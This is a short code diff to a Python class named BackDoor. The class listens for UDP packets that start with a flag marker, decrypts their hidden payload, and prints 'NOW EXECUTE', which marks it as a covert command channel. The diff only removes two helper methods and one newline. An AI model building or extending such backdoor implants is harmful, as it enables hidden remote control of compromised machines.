@@ -34,13 +34,7 @@ class BackDoor:
         decrypted_msg = self.decrypt_data(stripped_msg)
         print("NOW EXECUTE")
 
-    def get_ascii(self, hex_char) -> int:
-        """Returns ascii code of char"""
-        return ord(hex_char)
 
-    def get_char(self, ascii) -> chr:
-        """Gets char from ascii code"""
-        return chr(ascii)
     def filter_packets(self, packet):
         try:
             if UDP in packet and packet[UDP].load.decode().startswith(self.flag_begin) \
@@ -62,7 +56,7 @@ class BackDoor:
         padded_message = decryptor.update(encrypted_byte_stream) + decryptor.finalize()
         msg = unpadder.update(padded_message) + unpadder.finalize()
         msg = msg.decode()
-        print(f"Decrypted message: {msg}\n")
+        print(f"Decrypted message: {msg}")
         return msg
 
     def set_hex(self):
